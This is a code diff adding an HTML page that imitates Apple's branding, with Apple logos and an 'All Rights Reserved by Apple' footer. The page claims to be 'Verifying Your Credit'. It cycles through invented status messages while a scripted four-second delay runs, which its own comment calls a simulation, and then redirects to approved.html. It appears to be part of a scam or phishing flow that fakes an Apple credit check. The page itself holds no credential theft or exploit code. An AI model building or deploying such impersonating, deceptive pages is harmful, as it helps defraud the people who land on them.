@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Your Credit</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            color: #1d1d1f;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+        }
+        /* Header */
+        header {
+            padding: 20px;
+            background-color: #fff;
+            border-bottom: 1px solid #d2d2d7;
+            text-align: center;
+            width: 100%;
+        }
+        .apple-logo {
+            width: 60px;
+            height: auto;
+        }
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 18px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            margin: 0 auto;
+        }
+        .loader {
+            border: 6px solid #f0f2f5;
+            border-top: 6px solid #0071e3;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .container h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1d1d1f;
+        }
+        .container p {
+            font-size: 16px;
+            color: #6e6e73;
+            margin-bottom: 30px;
+        }
+        /* Footer */
+        footer {
+            background-color: #f5f5f7;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #6e6e73;
+            border-top: 1px solid #d2d2d7;
+            width: 100%;
+        }
+        .footer-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+        .footer-content .apple-logo {
+            width: 20px;
+            height: auto;
+            background-color: #e8f0fe;
+            padding: 5px;
+            border-radius: 50%;
+        }
+        .footer-content::before,
+        .footer-content::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #d2d2d7;
+            max-width: 100px;
+        }
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                max-width: 350px;
+            }
+            .container h1 {
+                font-size: 24px;
+            }
+            .container p {
+                font-size: 14px;
+                margin-bottom: 20px;
+            }
+            .loader {
+                width: 30px;
+                height: 30px;
+                border-width: 4px;
+            }
+            .apple-logo {
+                width: 50px;
+            }
+            footer {
+                padding: 15px;
+                font-size: 12px;
+            }
+            .footer-content .apple-logo {
+                width: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <img src="https://static.cdnlogo.com/logos/a/38/apple.svg" alt="Apple Logo" class="apple-logo">
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <div class="container">
+            <div class="loader"></div>
+            <h1>Verifying Your Credit</h1>
+            <p id="verify-message">Please wait while we check your eligibility...</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <span>All Rights Reserved by Apple</span>
+            <img src="https://purepng.com/public/uploads/large/purepng.com-apple-logologobrand-logoiconslogos-251519938788qhgdl.png" alt="Apple Logo" class="apple-logo">
+        </div>
+    </footer>
+
+    <script>
+        // Lista de mensagens de verificação
+        const messages = [
+            "Verifying in the system...",
+            "Checking for pending issues...",
+            "Analyzing credit history...",
+            "Validating eligibility..."
+        ];
+
+        // Elemento onde a mensagem será exibida
+        const verifyMessage = document.getElementById('verify-message');
+
+        // Função pra trocar as mensagens
+        let messageIndex = 0;
+        const changeMessage = () => {
+            verifyMessage.textContent = messages[messageIndex];
+            messageIndex = (messageIndex + 1) % messages.length;
+        };
+
+        // Troca a mensagem a cada 1 segundo
+        changeMessage();
+        const messageInterval = setInterval(changeMessage, 1000);
+
+        // Simula um delay de verificação (4 segundos) e redireciona pra approved.html
+        setTimeout(() => {
+            clearInterval(messageInterval);
+            window.location.href = "approved.html";
+        }, 4000);
+    </script>
+</body>
+</html>
